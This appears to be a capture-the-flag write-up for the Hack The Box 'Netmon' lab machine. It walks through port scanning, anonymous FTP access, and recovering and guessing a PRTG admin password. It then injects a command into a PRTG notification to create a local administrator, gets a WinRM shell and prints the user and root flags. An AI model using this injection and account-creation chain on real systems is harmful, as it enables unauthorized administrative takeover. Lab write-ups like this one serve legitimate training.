![Netmon.PNG](/assets/Machines/Easy/Netmon/Netmon.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.10.152
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.152
```
**Output**
```bash
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
```

3. Search more information about services and versiones with nmap
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Netmon]
└─| nmap -sCV -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.152 -oN services
```

**Output**
```bash
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_02-25-19  10:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

* We look **Paessler PRTG bandwidth monitor**, remember this.

4. If you go to web page, don't login with default credentials of **PRTG Network Monitor**, in this case we need to search more information.



4. Login anonymous to ftp
```bash
──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Netmon]
└─| ftp 10.10.10.152           
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp>
```

5. Cat **user flag** in path `/Users/Public`
```bash
ftp> type user.txt
0ececa35409d8c9f292899124da6f953
```

6. Now, we try to obtain a credentials to login in panel web page, to do this, go to `/Programdata/Paessler/PRTG Network Monitor` and get configuration files.
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Netmon]
└─| ls
ports  'PRTG Configuration.old'  'PRTG Configuration.old.bak'   services
```

7. Show the difference between two **PRTG Configurtaion** files
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Netmon]
└─| diff 'PRTG Configuration.old' 'PRTG Configuration.old.bak'
```

* Search in all difference and you find this credentials
```bash
>             <!-- User: prtgadmin -->
>             PrTg@dmin2018
```

8. Try to login in web page panel

![panelf.PNG](/assets/Machines/Easy/Netmon/panelf.PNG)

* In this case the password is incorrect, the machine realese three years ago, change **PrTg@dmin2018** -> **PrTg@dmin2019**

**Output**

![panels.PNG](/assets/Machines/Easy/Netmon/panels.PNG)


9. Now, search for exploits and you find this: https://www.codewatch.org/blog/?p=453

First, go to `notifications` and create a new 

![notifications.PNG](/assets/Machines/Easy/Netmon/notifications.PNG)

---
Next, change notification name and put this on **Execute Program**

![execute.PNG](/assets/Machines/Easy/Netmon/execute.PNG)

Command: `text.txt; net user <Username> <Password> /add; net localgroup Administrators <Previous Username> /add` 

---
Finally, save the notification.


10.  Click in order to execute a test of notification create previously

![en.PNG](/assets/Machines/Easy/Netmon/en.PNG)


11. Validate with crackmapexec if the user was create successfully
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Netmon]
└─| crackmapexec smb 10.10.10.152 -u '<User>' -p '<Password>' 
SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
SMB         10.10.10.152    445    NETMON           [+] netmon\<User>:<Password> (Pwn3d!)
```

* The user was create successfully!

12. Login in with **evil-winrm** with previous credentials
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Netmon]
└─| evil-winrm -i 10.10.10.152 -u '<User>' -p '<Password>'
```

**Output**
```bash
*Evil-WinRM* PS C:\Users\edison2\Documents>
```

13. Cat **root flag**
```cmd
*Evil-WinRM* PS C:\Users\Administrator\Desktop> pwd

Path
----
C:\Users\Administrator\Desktop
```
---
```cmd
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
c97ee0568fef4dabe40345a8b0844f11
```


